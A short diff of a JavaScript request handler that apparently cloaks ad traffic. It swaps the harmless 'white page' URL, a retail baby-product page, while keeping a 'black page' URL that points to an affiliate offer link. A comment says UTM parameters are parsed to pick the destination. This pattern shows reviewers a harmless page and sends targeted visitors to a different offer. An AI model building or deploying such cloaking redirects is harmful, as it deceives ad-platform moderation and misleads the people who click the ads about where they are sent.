@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.ikea.com/at/en/p/gulligast-baby-gym-multicolour-90484258/";
+    const whitePageURL = "https://www.zaybabyshop.at/en/products/personalisierte-geschenk-zur-geburt-junge";
     const blackPageURL = "https://uplevelrewarded.com/aff_c?offer_id=1232&aff_id=45076&source=scale";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
